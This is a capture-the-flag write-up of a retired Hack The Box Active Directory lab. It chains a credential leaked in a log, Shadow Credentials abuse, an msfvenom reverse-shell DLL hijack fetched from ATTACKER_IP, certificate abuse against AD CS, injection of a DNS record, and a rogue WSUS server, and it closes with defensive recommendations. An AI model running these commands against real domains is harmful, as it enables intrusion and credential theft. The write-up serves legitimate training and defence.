---
title: "Windows AD Lab — Log Leak, Shadow Credentials, and Rogue Update Service"
description: "A log-file credential leak, Shadow Credentials abuse, and a rogue update server chain to SYSTEM code execution."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - ad-cs
  - shadow-credentials
  - dll-hijack
  - wsus
---

> All target IPs, hostnames, credentials, hashes, and certificates in this document are sanitized placeholders. Techniques and command syntax are preserved for educational value.

## Summary

This retired Windows Active Directory lab chains several enterprise weaknesses: credential leakage in log files, Shadow Credentials abuse against a managed service account, a DLL hijack in an update monitor, AD CS certificate abuse for an update-service hostname, AD-integrated DNS record manipulation, and a rogue update server to execute a signed binary as SYSTEM.

## Context and Objective

The engagement targets a Windows domain environment with DNS, IIS, Kerberos, LDAP, SMB, WinRM, and WSUS services. Starting credentials for a low-privilege domain account are provided. The objective is full domain compromise via documented attack paths.

## Approach and Evidence

### Stage 1 — Enumeration and Credential Discovery

Port scanning reveals DNS (53), IIS (80), Kerberos (88), LDAP/LDAPS (389/636), SMB (445), WinRM (5985), and WSUS (8530/8531).

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN nmap/target-tcp
```

SMB enumeration with the starting account reveals a readable `Logs` share. Downloading the share contents exposes an identity synchronization trace log containing plaintext service credentials:

```
BindUser: "<DOMAIN>\<SERVICE_ACCOUNT>"
BindPass: "<SERVICE_PASSWORD_PATTERN>"
```

The leaked password follows a predictable year-rotation pattern. Incrementing the year in the password grants valid Kerberos-authenticated access to the service account.

```bash
nxc smb <TARGET_HOSTNAME> -u '<SERVICE_ACCOUNT>' -p '<ROTATED_PASSWORD>' -d <DOMAIN> -k
[+] <DOMAIN>\<SERVICE_ACCOUNT>:<ROTATED_PASSWORD>
```

BloodHound collection via `rusthound-ce` maps the service account's permissions in the domain.

### Stage 2 — Shadow Credentials to Managed Service Account

BloodHound reveals the service account has `GenericWrite` over `<MANAGED_SERVICE_ACCOUNT>`, enabling Shadow Credentials abuse.

A key credential is added to the target account using `pywhisker`, producing a PFX certificate and password:

```bash
python3 pywhisker.py \
  -d <DOMAIN> \
  -u '<SERVICE_ACCOUNT>' \
  -p '<ROTATED_PASSWORD>' \
  --target '<MANAGED_SERVICE_ACCOUNT>' \
  --action add -k
[+] Saved PFX certificate & key at path: <SHADOW_CREDENTIALS_PFX>
[*] Must be used with password: <PFX_PASSWORD>
```

The PFX is used with `gettgtpkinit.py` to obtain a TGT, then `getnthash.py` recovers the managed service account's NT hash:

```bash
python3 gettgtpkinit.py \
  -cert-pfx <SHADOW_CREDENTIALS_PFX> \
  -pfx-pass <PFX_PASSWORD> \
  '<DOMAIN>/<MANAGED_SERVICE_ACCOUNT>' '<MANAGED_SERVICE_ACCOUNT>.ccache'

export KRB5CCNAME='<MANAGED_SERVICE_ACCOUNT>.ccache'

python3 getnthash.py \
  -key <TGT_SESSION_KEY> \
  '<DOMAIN>/<MANAGED_SERVICE_ACCOUNT>'
```

```
Recovered NT Hash: <MSA_HEALTH_NT_HASH>
```

WinRM access is established with the recovered hash.

### Stage 3 — DLL Hijack to Another Domain User

Inside the managed service account session, the UpdateMonitor scheduled task logs reveal a DLL load failure:

```
No updates found locally: C:\ProgramData\UpdateMonitor\Settings_Update.zip
Loading update applier: C:\Program Files\UpdateMonitor\bin\settings_update.dll
Failed to load settings_update.dll. Error code: 126
```

The scheduled task runs as a different domain user, extracts `Settings_Update.zip`, and attempts to load `settings_update.dll`. The binary is confirmed 32-bit (`Machine type: 0x014C`). A 32-bit reverse shell DLL is generated, zipped, and placed at the expected path:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f dll -o settings_update.dll
zip Settings_Update.zip settings_update.dll
```

```powershell
iwr -OutFile C:\ProgramData\UpdateMonitor\Settings_Update.zip http://<ATTACKER_IP>:8888/Settings_Update.zip
```

When the scheduled task fires, the DLL executes as the target user, yielding a shell and user flag.

### Stage 4 — AD CS Certificate Abuse for WSUS

The compromised user can enroll in an `UpdateSrv` AD CS template. The template allows subject name injection and includes Server Authentication EKU — suitable for impersonating a WSUS TLS endpoint.

```bash
certipy req -k -no-pass \
  -u '<COMPROMISED_USER>@<DOMAIN>' \
  -ca '<CERTIFICATE_AUTHORITY>' \
  -template 'UpdateSrv' \
  -dns '<UPDATE_SERVICE_HOSTNAME>' \
  -target <DOMAIN_CONTROLLER_HOSTNAME> \
  -dc-ip <TARGET_IP>
```

The issued certificate and private key are extracted into PEM format for the rogue WSUS server.

### Stage 5 — AD DNS Record Creation

Using the managed service account's DNS permissions, a new AD-integrated DNS record points `<UPDATE_SERVICE_HOSTNAME>` to the operator address:

```bash
python3 dnstool.py \
  -u '<DOMAIN>\<MANAGED_SERVICE_ACCOUNT>' \
  -p '<MSA_HEALTH_NT_HASH>' \
  -r <UPDATE_SERVICE_HOSTNAME> \
  -a add \
  -d <ATTACKER_IP> \
  <TARGET_IP>
```

```bash
nslookup <UPDATE_SERVICE_HOSTNAME> <TARGET_IP>
Name:    <UPDATE_SERVICE_HOSTNAME>
Address:  <ATTACKER_IP>
```

### Stage 6 — Rogue WSUS Server and SYSTEM Execution

A rogue WSUS server is configured with the stolen certificate. It serves a signed binary configured to add the managed service account to local Administrators; the executable command is omitted.

Windows Update is triggered from the managed service account session:

```powershell
Stop-Service wuauserv -Force
Remove-Item "C:\Windows\SoftwareDistribution" -Recurse -Force
Start-Service wuauserv
wuauclt /resetauthorization /detectnow
usoclient StartScan
```

The client contacts the rogue WSUS endpoint, downloads the signed binary, and executes it. The managed service account is added to local Administrators, granting privileged WinRM access and the root flag.

## Challenges and Decisions

- The leaked password required year-rotation guessing; the pattern was confirmed by the log file's date context.
- The UpdateMonitor binary was 32-bit, requiring a matching architecture DLL — a 64-bit payload would fail silently.
- The AD CS template's subject name injection and Server Authentication EKU were prerequisites for the WSUS impersonation chain.
- The rogue WSUS attack is operationally complex (two ports, certificate binding, trigger timing) but effective when the target trusts the attacker-controlled endpoint.

## Outcome

Full domain compromise achieved through a six-stage chain: credential leak → Shadow Credentials → DLL hijack → AD CS certificate abuse → DNS manipulation → rogue WSUS execution. All stages were documented with source output confirming each result.

## Lessons and Recommendations

- Log files should never contain plaintext credentials; implement log scrubbing and access controls on diagnostic shares.
- Managed service accounts with weak ACLs (GenericWrite) are high-value targets for Shadow Credentials abuse.
- DLL hijacking in scheduled update workflows requires matching process architecture; defenders should validate DLL search paths.
- AD CS templates allowing subject name injection with Server Authentication EKU enable internal PKI abuse — audit template permissions and EKU assignments.
- WSUS infrastructure should use certificate pinning or mutual TLS to prevent rogue endpoint impersonation.
- DNS record creation permissions on AD-integrated zones should be tightly scoped; unexpected records may indicate compromise.

## References

- Hack The Box: retired Windows Active Directory lab — [Logging](https://app.hackthebox.com/machines/Logging)
- Tools referenced: `rustscan`, `nxc`, `rusthound-ce`, `pywhisker`, `gettgtpkinit.py`, `getnthash.py`, `certipy`, `dnstool.py`, `evil-winrm`, `msfvenom`
